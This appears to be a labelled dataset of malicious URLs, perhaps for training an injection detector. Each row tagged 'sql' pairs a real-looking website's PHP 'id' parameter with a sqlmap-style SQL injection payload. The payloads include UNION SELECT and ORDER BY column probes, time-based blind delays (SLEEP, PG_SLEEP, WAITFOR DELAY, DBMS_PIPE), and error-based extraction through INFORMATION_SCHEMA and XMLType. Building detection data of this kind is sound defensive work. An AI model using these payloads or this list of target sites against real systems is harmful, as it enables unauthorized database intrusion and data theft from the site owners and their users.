153,sql,http : / / www . ausmip . org / main . php ? id = 1 AND 9533 IN ( SELECT ( CHAR ( 113 ) +CHAR ( 118 ) +CHAR ( 106 ) +CHAR ( 98 ) +CHAR ( 113 ) + ( SELECT ( CASE WHEN ( 9533 = 9533 ) THEN CHAR ( 49 ) ELSE CHAR ( 48 ) END ) ) +CHAR ( 113 ) +CHAR ( 113 ) +CHAR ( 113 ) +CHAR ( 120 ) +CHAR ( 113 ) ) ) 
154,sql,http : / / www . realisticky . cz / ucebnice . php ? id = 1 UNION ALL SELECT NULL , NULL - - ctvb
155,sql,http : / / www . pyme . go . cr / cuadro1 . php ? id = 1 ' ) ORDER BY 1 - - tslS
156,sql,http : / / www . hrpub . org / journals / jour_info . php ? id = 1 ) AND SLEEP ( 5 ) AND ( 7824 = 7824
157,sql,http : / / www . ipicshopping . co . za / shopping_centre . php ? id = 1 AND SLEEP ( 5 ) 
158,sql,http : / / biblia . deon . pl / rozdzial . php ? id = 1 % ' ORDER BY 7815 - - mzUV
160,sql,http : / / www . vaughanchinese . com / new / websites / content . php ? id = 1 ORDER BY 1 - - kzEn
161,sql,http : / / alphaonenow . org / info . php ? id = 1 % ' UNION ALL SELECT NULL , NULL , NULL , NULL , NULL , NULL , NULL , NULL - - WYnw
162,sql,https : / / polenow . com / login . php ? id = 1 % ' AND 3611 = 3611 AND ' % ' = ' 
164,sql,http : / / www . justiceforsergei . com / video . php ? id = 1 % ' UNION ALL SELECT NULL , NULL , NULL , NULL , NULL , NULL , NULL , NULL - - WYnw
165,sql,http : / / www . mujahidkamran . com / books . php ? id = 1 AND 6592 = ( SELECT 6592 FROM PG_SLEEP ( 5 ) ) - - Qmvu
166,sql,https : / / www . anglesgallery . com / ssp_director / artistgallery . php ? id = 1 % ' AND SLEEP ( 5 ) AND ' % ' = ' 
167,sql,http : / / identitiesjournal . edu . mk / cat . php ? id = 1 UNION ALL SELECT NULL , NULL , NULL , NULL , NULL - - rjiF
168,sql,http : / / www . microfinance . lk / member_profile . php ? id = 1 % ' AND 9533 IN ( SELECT ( CHAR ( 113 ) +CHAR ( 118 ) +CHAR ( 106 ) +CHAR ( 98 ) +CHAR ( 113 ) + ( SELECT ( CASE WHEN ( 9533 = 9533 ) THEN CHAR ( 49 ) ELSE CHAR ( 48 ) END ) ) +CHAR ( 113 ) +CHAR ( 113 ) +CHAR ( 113 ) +CHAR ( 120 ) +CHAR ( 113 ) ) ) AND ' % ' = ' 
169,sql,http : / / www . aphesa . com / downloads / download2 . php ? id = 1 ) AND 3611 = 3611 AND ( 5554 = 5554
170,sql,http : / / www . microatena . it / biblioteca . php ? id = 1 ' AND 7622 = CAST ( ( CHR ( 113 ) | | CHR ( 118 ) | | CHR ( 106 ) | | CHR ( 98 ) | | CHR ( 113 ) ) | | ( SELECT ( CASE WHEN ( 7622 = 7622 ) THEN 1 ELSE 0 END ) ) : : text | | ( CHR ( 113 ) | | CHR ( 113 ) | | CHR ( 113 ) | | CHR ( 120 ) | | CHR ( 113 ) ) AS NUMERIC ) AND ' VCNg ' = ' VCNg
171,sql,https : / / www . safari - hotels . com / site / 3 . php ? id = 1 ' ) ORDER BY 1 - - tslS
172,sql,http : / / dancingbetty . com / product - list . php ? id = 1 UNION ALL SELECT NULL , NULL , NULL , NULL , NULL , NULL - - ntmA
173,sql,http : / / www . terraclean . net / product . php ? id = 1 % ' ORDER BY 1 - - KBQw
174,sql,http : / / www . gainwelltravel . com / cms . php ? id = 1 ' AND 7622 = CAST ( ( CHR ( 113 ) | | CHR ( 118 ) | | CHR ( 106 ) | | CHR ( 98 ) | | CHR ( 113 ) ) | | ( SELECT ( CASE WHEN ( 7622 = 7622 ) THEN 1 ELSE 0 END ) ) : : text | | ( CHR ( 113 ) | | CHR ( 113 ) | | CHR ( 113 ) | | CHR ( 120 ) | | CHR ( 113 ) ) AS NUMERIC ) AND ' VCNg ' = ' VCNg
175,sql,http : / / www . morini . ch / product_det . php ? id = 1 ' ORDER BY 6555 - - CoTc
176,sql,http : / / www . renexpo - bih . com / index . php ? id = 1 % ' UNION ALL SELECT NULL , NULL , NULL , NULL , NULL , NULL , NULL , NULL - - WYnw
178,sql,https : / / learning . thefa . com / totara / program / view . php ? id = 1 AND 7622 = CAST ( ( CHR ( 113 ) | | CHR ( 118 ) | | CHR ( 106 ) | | CHR ( 98 ) | | CHR ( 113 ) ) | | ( SELECT ( CASE WHEN ( 7622 = 7622 ) THEN 1 ELSE 0 END ) ) : : text | | ( CHR ( 113 ) | | CHR ( 113 ) | | CHR ( 113 ) | | CHR ( 120 ) | | CHR ( 113 ) ) AS NUMERIC ) 
179,sql,http : / / www . austinminiatures . com / products . php ? id = 1 % ' AND SLEEP ( 5 ) AND ' % ' = ' 
180,sql,http : / / kpd1 . ru / catalog . php ? id = 1 . 8ChSI
181,sql,http : / / www . habibitours . com / cat . php ? id = 1 ) UNION ALL SELECT NULL , NULL , NULL , NULL - - zhRN
182,sql,http : / / www . daesgroup . com / region . php ? id = 1 ' ) UNION ALL SELECT NULL , NULL , NULL , NULL - - atbf
183,sql,http : / / www . ventrilo . com / dlprod . php ? id = 1 ' ) AND 6592 = ( SELECT 6592 FROM PG_SLEEP ( 5 ) ) AND ( ' bARY ' = ' bARY
184,sql,http : / / www . system16 . com / museum . php ? id = 1 ' ) AND ( SELECT 9697 FROM ( SELECT COUNT ( * ) , CONCAT ( 0x71766a6271 , ( SELECT ( ELT ( 9697 = 9697 , 1 ) ) ) , 0x7171717871 , FLOOR ( RAND ( 0 ) *2 ) ) x FROM INFORMATION_SCHEMA . PLUGINS GROUP BY x ) a ) AND ( ' DVsm ' = ' DVsm
185,sql,http : / / www . stabilizationandtransition . org / Bio . php ? id = 1 UNION ALL SELECT NULL , NULL , NULL , NULL - - fKpc
186,sql,http : / / www . turbaza - volgograd . ru / viewbase . php ? id = 1 % ' UNION ALL SELECT NULL , NULL , NULL , NULL , NULL - - nBvv
187,sql,http : / / www . sunxtender . com / solarbattery . php ? id = 1 ' ) ORDER BY 1 - - tslS
188,sql,http : / / www . cmt - net . org / index . php ? id = 1 ' UNION ALL SELECT NULL , NULL , NULL , NULL , NULL , NULL - - mqyP
189,sql,http : / / www . cultuurwijzerapeldoorn . nl / cultuurmenu . php ? id = 1 ' ) UNION ALL SELECT NULL , NULL , NULL , NULL - - atbf
190,sql,http : / / www . indiainfrastructure . com / shopping_cart . php ? id = 1 ' UNION ALL SELECT NULL , NULL - - ViPr
191,sql,https : / / www . kianjoocan . com . my / index . php ? id = 1 ORDER BY 1 - - kzEn
194,sql,http : / / ska3 . ru / bummi . php ? id = ( SELECT CHAR ( 113 ) +CHAR ( 118 ) +CHAR ( 106 ) +CHAR ( 98 ) +CHAR ( 113 ) + ( SELECT ( CASE WHEN ( 5838 = 5838 ) THEN CHAR ( 49 ) ELSE CHAR ( 48 ) END ) ) +CHAR ( 113 ) +CHAR ( 113 ) +CHAR ( 113 ) +CHAR ( 120 ) +CHAR ( 113 ) ) 
195,sql,http : / / www . caosciotocounty . org / template . php ? id = 1 ' ) ;SELECT DBMS_PIPE . RECEIVE_MESSAGE ( CHR ( 84 ) | | CHR ( 106 ) | | CHR ( 102 ) | | CHR ( 83 ) , 5 ) FROM DUAL - - 
197,sql,http : / / www . askewsfoods . com / stores . php ? id = 1 UNION ALL SELECT NULL , NULL - - ctvb
198,sql,http : / / www . firstinmichigan . org / stream . php ? id = 1 UNION ALL SELECT NULL , NULL , NULL , NULL , NULL , NULL - - qwPK
199,sql,http : / / boywhofell . com / index . php ? id = 1 % ' WAITFOR DELAY ' 0 : 0 : 5 ' AND ' % ' = ' 
200,sql,https : / / www . arabculturefund . org / projects / project . php ? id = ( SELECT ( CASE WHEN ( 3684 = 3684 ) THEN 3684 ELSE 3684* ( SELECT 3684 FROM INFORMATION_SCHEMA . PLUGINS ) END ) ) 
201,sql,https : / / www . zobodat . at / publikation_series . php ? id = 5433 - 5432
202,sql,http : / / stfranciscountyar . org / page . php ? id = 1 ' ) UNION ALL SELECT NULL - - eEGL
203,sql,http : / / www . harvestlink . com / productsDia . php ? id = 1 ORDER BY 1 - - lAea
204,sql,http : / / www . indiannumismatics . com / products . php ? id = ( SELECT ( CASE WHEN ( 9362 = 8798 ) THEN 9362 ELSE 9362* ( SELECT 9362 FROM INFORMATION_SCHEMA . PLUGINS ) END ) ) 
205,sql,http : / / www . integral - eu . com / index . php ? id = 5433 - 5432
206,sql,http : / / www . howtostudy . org / resources_skill . php ? id = 1 % ' WAITFOR DELAY ' 0 : 0 : 5 ' AND ' % ' = ' 
207,sql,http : / / www . prazskamuzejninoc . cz / 2017 / clanek . php ? id = 1 AND 2076 = 1452 - - zXSW
209,sql,http : / / netintel . ru / index . php ? id = 1 UNION ALL SELECT NULL - - jscU
210,sql,http : / / www . shortrifles . com / configuration . php ? id = 1 % ' AND 9940 = DBMS_PIPE . RECEIVE_MESSAGE ( CHR ( 73 ) | | CHR ( 111 ) | | CHR ( 115 ) | | CHR ( 104 ) , 5 ) AND ' % ' = ' 
212,sql,http : / / www . atmarine . fi / index . php ? id = ( SELECT CONCAT ( 0x71766a6271 , ( SELECT ( ELT ( 3360 = 3360 , 1 ) ) ) , 0x7171717871 ) ) 
213,sql,http : / / www . marsfigures . com / main . php ? id = 1 ) AND 9940 = DBMS_PIPE . RECEIVE_MESSAGE ( CHR ( 73 ) | | CHR ( 111 ) | | CHR ( 115 ) | | CHR ( 104 ) , 5 ) AND ( 4586 = 4586
214,sql,http : / / www . rysslandsresor . se / index . php ? id = 5433 - 5432
215,sql,https : / / www . ecabank . com / home / index . php ? id = 1 ' ) AND SLEEP ( 5 ) AND ( ' GJyr ' = ' GJyr
216,sql,http : / / bram . smartelectronix . com / plugins . php ? id = 1" ) ) ) ( , , ) ' ) 
217,sql,http : / / www . gardenfarmgolf . com / en_locations . php ? id = 1 % ' UNION ALL SELECT NULL , NULL , NULL , NULL - - vGXN
218,sql,http : / / orgia . ru / about . php ? id = 1 % ' AND 9533 IN ( SELECT ( CHAR ( 113 ) +CHAR ( 118 ) +CHAR ( 106 ) +CHAR ( 98 ) +CHAR ( 113 ) + ( SELECT ( CASE WHEN ( 9533 = 9533 ) THEN CHAR ( 49 ) ELSE CHAR ( 48 ) END ) ) +CHAR ( 113 ) +CHAR ( 113 ) +CHAR ( 113 ) +CHAR ( 120 ) +CHAR ( 113 ) ) ) AND ' % ' = ' 
219,sql,http : / / www . goafilms . com / location . php ? id = 1 UNION ALL SELECT NULL - - uRNf
220,sql,http : / / learnonline . health . nz / course / category . php ? id = 1 ) ;SELECT PG_SLEEP ( 5 ) - - 
221,sql,http : / / www . stasy . gr / index . php ? id = 1 ' ) UNION ALL SELECT NULL , NULL - - utDw
222,sql,https : / / malffb . gov . vu / index . php ? id = 1 AND 9940 = DBMS_PIPE . RECEIVE_MESSAGE ( CHR ( 73 ) | | CHR ( 111 ) | | CHR ( 115 ) | | CHR ( 104 ) , 5 ) 
223,sql,http : / / njsfwc . org / projects . php ? id = 1 AND 9533 IN ( SELECT ( CHAR ( 113 ) +CHAR ( 118 ) +CHAR ( 106 ) +CHAR ( 98 ) +CHAR ( 113 ) + ( SELECT ( CASE WHEN ( 9533 = 9533 ) THEN CHAR ( 49 ) ELSE CHAR ( 48 ) END ) ) +CHAR ( 113 ) +CHAR ( 113 ) +CHAR ( 113 ) +CHAR ( 120 ) +CHAR ( 113 ) ) ) 
224,sql,http : / / www . krao . ru / cd - item . php ? id = 1 AND 3050 = 5102
225,sql,http : / / www . ulagos . cl / contenido03 . php ? id = 1 % ' WAITFOR DELAY ' 0 : 0 : 5 ' AND ' % ' = ' 
226,sql,https : / / wciom . ru / index . php ? id = 1 ) UNION ALL SELECT NULL , NULL , NULL , NULL - - zhRN
227,sql,http : / / www . icehalo . ca / products . php ? id = 1 ORDER BY 1715 - - vHUQ
228,sql,http : / / www . vittoria - shoes . com / prodotto . php ? id = 1 ) ;SELECT DBMS_PIPE . RECEIVE_MESSAGE ( CHR ( 84 ) | | CHR ( 106 ) | | CHR ( 102 ) | | CHR ( 83 ) , 5 ) FROM DUAL - - 
229,sql,http : / / mkogan . com / duty . php ? id = 1 ' ) UNION ALL SELECT NULL , NULL , NULL , NULL - - atbf
230,sql,https : / / koreamed . org / JournalVolume . php ? id = 1 AND ( SELECT 9697 FROM ( SELECT COUNT ( * ) , CONCAT ( 0x71766a6271 , ( SELECT ( ELT ( 9697 = 9697 , 1 ) ) ) , 0x7171717871 , FLOOR ( RAND ( 0 ) *2 ) ) x FROM INFORMATION_SCHEMA . PLUGINS GROUP BY x ) a ) 
231,sql,http : / / www . skytraktravel . com / services . php ? id = 1 ' UNION ALL SELECT NULL - - lmXC
232,sql,http : / / www . uba . ar / academicos / uba21 / contenidos . php ? id = 1 UNION ALL SELECT NULL , NULL , NULL , NULL - - fKpc
233,sql,http : / / www . isconshanghai . org / web / page . php ? id = 1 ) UNION ALL SELECT NULL , NULL , NULL , NULL - - zhRN
234,sql,https : / / www . id . ee / index . php ? id = 1 % ' ;SELECT PG_SLEEP ( 5 ) - - 
236,sql,http : / / pastelspace . com / collection . php ? id = 1 ) AND ( SELECT 9697 FROM ( SELECT COUNT ( * ) , CONCAT ( 0x71766a6271 , ( SELECT ( ELT ( 9697 = 9697 , 1 ) ) ) , 0x7171717871 , FLOOR ( RAND ( 0 ) *2 ) ) x FROM INFORMATION_SCHEMA . PLUGINS GROUP BY x ) a ) AND ( 6121 = 6121
237,sql,https : / / www . sjs . org . hk / en / services / services . php ? id = 1 AND SLEEP ( 5 ) 
238,sql,http : / / maximaaa . com / mform / view . php ? id = 1 ) UNION ALL SELECT NULL , NULL , NULL , NULL , NULL , NULL , NULL , NULL , NULL , NULL - - CEEX
239,sql,http : / / www . echmb . com / about_details . php ? id = 1 ) AND 3611 = 3611 AND ( 5554 = 5554
240,sql,https : / / toxtown . nlm . nih . gov / text_version / chemicals . php ? id = 1 ) UNION ALL SELECT NULL , NULL , NULL , NULL , NULL , NULL , NULL , NULL , NULL , NULL - - CEEX
241,sql,http : / / www . med . muni . cz / index . php ? id = 1 ' UNION ALL SELECT NULL , NULL , NULL , NULL , NULL , NULL , NULL - - PViD
242,sql,http : / / len - zoloto . ru / index . php ? id = 1 % ' ;SELECT DBMS_PIPE . RECEIVE_MESSAGE ( CHR ( 84 ) | | CHR ( 106 ) | | CHR ( 102 ) | | CHR ( 83 ) , 5 ) FROM DUAL - - 
244,sql,http : / / www . nordiqc . org / epitope . php ? id = 1 ORDER BY 1 - - kzEn
245,sql,http : / / meninositu . com . br / galeria / album . php ? id = 1 ' NKZqCS< ' ">bIRAbA
246,sql,https : / / www . nttgroup . co . za / proc / dealer_detail . php ? id = 1 % ' AND ( SELECT 9697 FROM ( SELECT COUNT ( * ) , CONCAT ( 0x71766a6271 , ( SELECT ( ELT ( 9697 = 9697 , 1 ) ) ) , 0x7171717871 , FLOOR ( RAND ( 0 ) *2 ) ) x FROM INFORMATION_SCHEMA . PLUGINS GROUP BY x ) a ) AND ' % ' = ' 
247,sql,http : / / www . hold . com . tw / product . php ? id = 1 ) UNION ALL SELECT NULL - - fqfI
248,sql,http : / / www . catsg . org / index . php ? id = 1 ' UNION ALL SELECT NULL , NULL , NULL , NULL , NULL , NULL - - mqyP
249,sql,http : / / www . theurbanrange . com / poet . php ? id = 1 ' ) UNION ALL SELECT NULL , NULL , NULL - - SOSW
250,sql,http : / / www . markzaid . com / biography . php ? id = 1 ) AND ( SELECT 9697 FROM ( SELECT COUNT ( * ) , CONCAT ( 0x71766a6271 , ( SELECT ( ELT ( 9697 = 9697 , 1 ) ) ) , 0x7171717871 , FLOOR ( RAND ( 0 ) *2 ) ) x FROM INFORMATION_SCHEMA . PLUGINS GROUP BY x ) a ) AND ( 6121 = 6121
251,sql,http : / / www . markdrum . it / product_detail . php ? id = 1 ' UNION ALL SELECT NULL , NULL , NULL - - hhTM
252,sql,http : / / www . madisonpac . com / key_details . php ? id = 1 UNION ALL SELECT NULL , NULL , NULL , NULL , NULL , NULL , NULL - - gXRN
253,sql,http : / / pyb . co . uk / cakes - detail . php ? id = 1 AND 6592 = ( SELECT 6592 FROM PG_SLEEP ( 5 ) ) 
254,sql,http : / / www . dengy - vsem . ru / prokrizis_vid . php ? id = 1 ' WAITFOR DELAY ' 0 : 0 : 5 ' AND ' cIcm ' = ' cIcm
255,sql,http : / / one - thebrand . com / cart . php ? id = 1 % ' AND 7622 = CAST ( ( CHR ( 113 ) | | CHR ( 118 ) | | CHR ( 106 ) | | CHR ( 98 ) | | CHR ( 113 ) ) | | ( SELECT ( CASE WHEN ( 7622 = 7622 ) THEN 1 ELSE 0 END ) ) : : text | | ( CHR ( 113 ) | | CHR ( 113 ) | | CHR ( 113 ) | | CHR ( 120 ) | | CHR ( 113 ) ) AS NUMERIC ) AND ' % ' = ' 
256,sql,https : / / www . studyastronomy . com / courses . php ? id = 1 AND 7622 = CAST ( ( CHR ( 113 ) | | CHR ( 118 ) | | CHR ( 106 ) | | CHR ( 98 ) | | CHR ( 113 ) ) | | ( SELECT ( CASE WHEN ( 7622 = 7622 ) THEN 1 ELSE 0 END ) ) : : text | | ( CHR ( 113 ) | | CHR ( 113 ) | | CHR ( 113 ) | | CHR ( 120 ) | | CHR ( 113 ) ) AS NUMERIC ) 
257,sql,http : / / kyoukaigun . jp / visit / detail . php ? id = 1 % ' WAITFOR DELAY ' 0 : 0 : 5 ' AND ' % ' = ' 
258,sql,http : / / www . traditionalcottages . gr / page . php ? id = 1 UNION ALL SELECT NULL , NULL , NULL , NULL , NULL , NULL , NULL , NULL - - IKMj
259,sql,https : / / primes . utm . edu / top20 / page . php ? id = 1 % ' UNION ALL SELECT NULL , NULL , NULL , NULL , NULL - - nBvv
260,sql,http : / / www . strategictransitions . com / productDetail . php ? id = 1 ' ) ;WAITFOR DELAY ' 0 : 0 : 5 ' - - 
261,sql,http : / / www . signsinthecity . net / info . php ? id = ( SELECT ( CASE WHEN ( 9362 = 8798 ) THEN 9362 ELSE 9362* ( SELECT 9362 FROM INFORMATION_SCHEMA . PLUGINS ) END ) ) 
262,sql,http : / / www . wsid . info / mod / page / view . php ? id = 1 ' AND 9533 IN ( SELECT ( CHAR ( 113 ) +CHAR ( 118 ) +CHAR ( 106 ) +CHAR ( 98 ) +CHAR ( 113 ) + ( SELECT ( CASE WHEN ( 9533 = 9533 ) THEN CHAR ( 49 ) ELSE CHAR ( 48 ) END ) ) +CHAR ( 113 ) +CHAR ( 113 ) +CHAR ( 113 ) +CHAR ( 120 ) +CHAR ( 113 ) ) ) AND ' zLoF ' = ' zLoF
263,sql,http : / / www . walpax . com . br / beachresorts . php ? id = 1 % ' AND ( SELECT 9697 FROM ( SELECT COUNT ( * ) , CONCAT ( 0x71766a6271 , ( SELECT ( ELT ( 9697 = 9697 , 1 ) ) ) , 0x7171717871 , FLOOR ( RAND ( 0 ) *2 ) ) x FROM INFORMATION_SCHEMA . PLUGINS GROUP BY x ) a ) AND ' % ' = ' 
265,sql,http : / / www . czga . ro / pagina . php ? id = 1 % ' UNION ALL SELECT NULL - - rJyU
266,sql,http : / / victorhospital . com / services . php ? id = 1 ' ) UNION ALL SELECT NULL , NULL , NULL , NULL , NULL , NULL , NULL , NULL , NULL - - fmtt
267,sql,http : / / www . hrvatskonumizmatickodrustvo . hr / index . php ? id = 1 ' ) ;WAITFOR DELAY ' 0 : 0 : 5 ' - - 
268,sql,http : / / www . medistock . fr / en / catalogue . php ? id = 1 ' AND 9940 = DBMS_PIPE . RECEIVE_MESSAGE ( CHR ( 73 ) | | CHR ( 111 ) | | CHR ( 115 ) | | CHR ( 104 ) , 5 ) AND ' BOxx ' = ' BOxx
269,sql,http : / / www . tunesoman . com / product . php ? id = 1 ' ) AND 4249 = ( SELECT UPPER ( XMLType ( CHR ( 60 ) | | CHR ( 58 ) | | CHR ( 113 ) | | CHR ( 118 ) | | CHR ( 106 ) | | CHR ( 98 ) | | CHR ( 113 ) | | ( SELECT ( CASE WHEN ( 4249 = 4249 ) THEN 1 ELSE 0 END ) FROM DUAL ) | | CHR ( 113 ) | | CHR ( 113 ) | | CHR ( 113 ) | | CHR ( 120 ) | | CHR ( 113 ) | | CHR ( 62 ) ) ) FROM DUAL ) AND ( ' mQhu ' = ' mQhu
270,sql,https : / / www . agencevu . com / photographers / photographer . php ? id = 1 ) UNION ALL SELECT NULL , NULL , NULL , NULL , NULL , NULL , NULL , NULL , NULL , NULL - - CEEX
271,sql,http : / / xn - - 90abdeg4afamkcabfvi7a8q . xn - - p1ai / page . php ? id = 1 WAITFOR DELAY ' 0 : 0 : 5 ' 
272,sql,https : / / www . becker - international . com / index . php ? id = 1 ORDER BY 1 - - kzEn
273,sql,http : / / www . mcfolsom . com / page . php ? id = 1 % ' UNION ALL SELECT NULL , NULL , NULL , NULL , NULL , NULL , NULL - - rvrn
274,sql,http : / / www . world - art . ru / people . php ? id = ( SELECT 8610 FROM ( SELECT COUNT ( * ) , CONCAT ( 0x71766a6271 , ( SELECT ( ELT ( 8610 = 8610 , 1 ) ) ) , 0x7171717871 , FLOOR ( RAND ( 0 ) *2 ) ) x FROM INFORMATION_SCHEMA . PLUGINS GROUP BY x ) a ) 
275,sql,http : / / xn - - n1addli . xn - - p1ai / index . php ? id = 1 UNION ALL SELECT NULL - - uRNf
276,sql,http : / / www . wenggroup . com / product . php ? id = 1 % ' AND 3611 = 3611 AND ' % ' = ' 
277,sql,https : / / www . cathouseonthekings . com / video / webcam . php ? id = 1 ORDER BY 4721 - - gPsZ
278,sql,http : / / www . pacific - textiles . com / businesses_facilities . php ? id = 1 AND SLEEP ( 5 ) - - THvg
279,sql,http : / / www . accessibleireland . com / category . php ? id = 1 ) AND 5836 = 4675 AND ( 5312 = 5312
280,sql,http : / / www . vaganova . ru / page . php ? id = 1 AND 4249 = ( SELECT UPPER ( XMLType ( CHR ( 60 ) | | CHR ( 58 ) | | CHR ( 113 ) | | CHR ( 118 ) | | CHR ( 106 ) | | CHR ( 98 ) | | CHR ( 113 ) | | ( SELECT ( CASE WHEN ( 4249 = 4249 ) THEN 1 ELSE 0 END ) FROM DUAL ) | | CHR ( 113 ) | | CHR ( 113 ) | | CHR ( 113 ) | | CHR ( 120 ) | | CHR ( 113 ) | | CHR ( 62 ) ) ) FROM DUAL ) 
281,sql,http : / / vill . hakuba . nagano . jp / livecam / livecamera . php ? id = 1 WAITFOR DELAY ' 0 : 0 : 5 ' 
282,sql,http : / / www . nagarapro . co . jp / top / artist / artist . php ? id = 1 ) ;WAITFOR DELAY ' 0 : 0 : 5 ' - - 
283,sql,http : / / www . nhf . org . bd / aboutus . php ? id = 1 AND SLEEP ( 5 ) - - THvg
284,sql,http : / / www . radimpex . rs / download . php ? id = 1 ) AND SLEEP ( 5 ) AND ( 7824 = 7824
285,sql,https : / / pubgshowcase . com / containers . php ? id = 1 ' ) UNION ALL SELECT NULL - - eEGL
286,sql,http : / / www . seehydropower . eu / download_tools / details . php ? id = 1 ' ) ;WAITFOR DELAY ' 0 : 0 : 5 ' - - 
287,sql,https : / / unite . ut . ee / posts . php ? id = 1 ' AND ( SELECT 9697 FROM ( SELECT COUNT ( * ) , CONCAT ( 0x71766a6271 , ( SELECT ( ELT ( 9697 = 9697 , 1 ) ) ) , 0x7171717871 , FLOOR ( RAND ( 0 ) *2 ) ) x FROM INFORMATION_SCHEMA . PLUGINS GROUP BY x ) a ) AND ' JKvn ' = ' JKvn
288,sql,http : / / www . arabterm . org / index . php ? id = 1 AND 3611 = 3611 - - SJqY
289,sql,https : / / www . forum - pianoteq . com / viewforum . php ? id = 1 ' AND 9940 = DBMS_PIPE . RECEIVE_MESSAGE ( CHR ( 73 ) | | CHR ( 111 ) | | CHR ( 115 ) | | CHR ( 104 ) , 5 ) AND ' BOxx ' = ' BOxx
290,sql,http : / / www . yitechnology . com / support - faq . php ? id = ( SELECT CONCAT ( 0x71766a6271 , ( SELECT ( ELT ( 3360 = 3360 , 1 ) ) ) , 0x7171717871 ) ) 
291,sql,http : / / www . brahmos . com / content . php ? id = 1 % ' UNION ALL SELECT NULL , NULL , NULL - - Lunn
292,sql,https : / / www . flapjackfunds . com / program . php ? id = 1;SELECT DBMS_PIPE . RECEIVE_MESSAGE ( CHR ( 84 ) | | CHR ( 106 ) | | CHR ( 102 ) | | CHR ( 83 ) , 5 ) FROM DUAL - - 
293,sql,http : / / corp . toei - anim . co . jp / en / film / pickup . php ? id = 1 ' ORDER BY 6555 - - CoTc
295,sql,http : / / www . iias - trieste - maribor . eu / index . php ? id = 1 AND ( SELECT 9697 FROM ( SELECT COUNT ( * ) , CONCAT ( 0x71766a6271 , ( SELECT ( ELT ( 9697 = 9697 , 1 ) ) ) , 0x7171717871 , FLOOR ( RAND ( 0 ) *2 ) ) x FROM INFORMATION_SCHEMA . PLUGINS GROUP BY x ) a ) - - NonP
296,sql,http : / / www . m - e - l . fr / fiche - education - artistique . php ? id = 1 UNION ALL SELECT NULL , NULL , NULL , NULL , NULL , NULL , NULL , NULL - - IKMj
297,sql,http : / / www . rancinan . com / official / photos . php ? id = 1 % ' AND 7622 = CAST ( ( CHR ( 113 ) | | CHR ( 118 ) | | CHR ( 106 ) | | CHR ( 98 ) | | CHR ( 113 ) ) | | ( SELECT ( CASE WHEN ( 7622 = 7622 ) THEN 1 ELSE 0 END ) ) : : text | | ( CHR ( 113 ) | | CHR ( 113 ) | | CHR ( 113 ) | | CHR ( 120 ) | | CHR ( 113 ) ) AS NUMERIC ) AND ' % ' = ' 
299,sql,http : / / www . mherc . mb . ca / page . php ? id = 1 ' ) AND ( SELECT 9697 FROM ( SELECT COUNT ( * ) , CONCAT ( 0x71766a6271 , ( SELECT ( ELT ( 9697 = 9697 , 1 ) ) ) , 0x7171717871 , FLOOR ( RAND ( 0 ) *2 ) ) x FROM INFORMATION_SCHEMA . PLUGINS GROUP BY x ) a ) AND ( ' DVsm ' = ' DVsm
300,sql,http : / / molvica . org / vesti_content . php ? id = 1 ' ) AND 4249 = ( SELECT UPPER ( XMLType ( CHR ( 60 ) | | CHR ( 58 ) | | CHR ( 113 ) | | CHR ( 118 ) | | CHR ( 106 ) | | CHR ( 98 ) | | CHR ( 113 ) | | ( SELECT ( CASE WHEN ( 4249 = 4249 ) THEN 1 ELSE 0 END ) FROM DUAL ) | | CHR ( 113 ) | | CHR ( 113 ) | | CHR ( 113 ) | | CHR ( 120 ) | | CHR ( 113 ) | | CHR ( 62 ) ) ) FROM DUAL ) AND ( ' mQhu ' = ' mQhu
301,sql,http : / / www . dreamville - bg . com / ru / complex . php ? id = 1 UNION ALL SELECT NULL , NULL - - ctvb
302,sql,http : / / www . thespastudios . com / p . php ? id = 1 ) AND ( SELECT 9697 FROM ( SELECT COUNT ( * ) , CONCAT ( 0x71766a6271 , ( SELECT ( ELT ( 9697 = 9697 , 1 ) ) ) , 0x7171717871 , FLOOR ( RAND ( 0 ) *2 ) ) x FROM INFORMATION_SCHEMA . PLUGINS GROUP BY x ) a ) AND ( 6121 = 6121
303,sql,https : / / www . i - cpan . es / detallePregunta . php ? id = 1 ' ) ORDER BY 1 - - tslS
304,sql,http : / / www . tomkane . com / section . php ? id = 1 ) ORDER BY 1 - - zRhc
305,sql,http : / / www . belmos . ru / transp - artcl . php ? id = 1 UNION ALL SELECT NULL , NULL , NULL - - TLHU
306,sql,https : / / 74 . ru / forum / view . php ? id = 1 AND 6592 = ( SELECT 6592 FROM PG_SLEEP ( 5 ) ) 
307,sql,http : / / www . lecoshop . ru / dir . php ? id = 1 ' ) AND 6592 = ( SELECT 6592 FROM PG_SLEEP ( 5 ) ) AND ( ' bARY ' = ' bARY
308,sql,http : / / www . jevicko . cz / index . php ? id = 1 ' ) AND 6592 = ( SELECT 6592 FROM PG_SLEEP ( 5 ) ) AND ( ' bARY ' = ' bARY
309,sql,http : / / www . vlktravel . com / tour . php ? id = 1 ) AND 9533 IN ( SELECT ( CHAR ( 113 ) +CHAR ( 118 ) +CHAR ( 106 ) +CHAR ( 98 ) +CHAR ( 113 ) + ( SELECT ( CASE WHEN ( 9533 = 9533 ) THEN CHAR ( 49 ) ELSE CHAR ( 48 ) END ) ) +CHAR ( 113 ) +CHAR ( 113 ) +CHAR ( 113 ) +CHAR ( 120 ) +CHAR ( 113 ) ) ) AND ( 1264 = 1264
310,sql,http : / / www . anm - conso . com / prof - 03 . php ? id = 1 UNION ALL SELECT NULL , NULL , NULL , NULL , NULL - - bDCI
311,sql,https : / / www . filter . ru / index . php ? id = 1 ' ;SELECT PG_SLEEP ( 5 ) - - 
312,sql,http : / / ohiofoodbanks . org / programs / programs . php ? id = 6787
314,sql,http : / / 2017 . tiff - jp . net / ja / lineup / works . php ? id = 1 ' ORDER BY 1 - - Hgvf
315,sql,http : / / www . sriaurobindoashram . org / music / sunil / index . php ? id = 1 UNION ALL SELECT NULL , NULL , NULL , NULL , NULL , NULL , NULL , NULL - - wXih
316,sql,http : / / eurofo . ru / m / viewforum . php ? id = 1 ) AND 9533 IN ( SELECT ( CHAR ( 113 ) +CHAR ( 118 ) +CHAR ( 106 ) +CHAR ( 98 ) +CHAR ( 113 ) + ( SELECT ( CASE WHEN ( 9533 = 9533 ) THEN CHAR ( 49 ) ELSE CHAR ( 48 ) END ) ) +CHAR ( 113 ) +CHAR ( 113 ) +CHAR ( 113 ) +CHAR ( 120 ) +CHAR ( 113 ) ) ) AND ( 1264 = 1264
318,sql,http : / / animatch . ca / machform / view . php ? id = 1 ' ) UNION ALL SELECT NULL , NULL - - utDw
319,sql,http : / / www . sydneyshoot . com / buy . php ? id = 1 ) ORDER BY 1 - - zRhc
